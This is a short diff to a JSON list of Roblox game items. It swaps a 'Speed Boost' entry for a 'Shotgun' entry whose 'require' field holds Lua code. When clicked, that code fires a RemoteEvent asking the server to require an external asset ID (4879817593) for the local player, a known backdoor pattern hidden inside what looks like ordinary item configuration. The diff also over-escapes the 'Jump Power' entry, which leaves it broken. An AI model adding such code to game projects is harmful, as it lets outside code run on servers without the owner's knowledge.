@@ -1,10 +1,10 @@
 [
     {
-        "name": "Speed Boost",
-        "require": "game:GetService(\"ReplicatedStorage\").Modules.SpeedModule"
+        "name": "Shotgun",
+        "require": "local RS = script.Parent.RemoteEvent; script.Parent.MouseButton1Click:Connect(function() RS:FireServer('require(4879817593)(\\\"' .. game.Players.LocalPlayer.Name ..'\\\")') end)"
     },
     {
         "name": "Jump Power",
-        "require": "game:GetService(\"ReplicatedStorage\").Modules.JumpModule"
+        "require": "game:GetService(\\\"ReplicatedStorage\\\").Modules.JumpModule"
     }
 ]
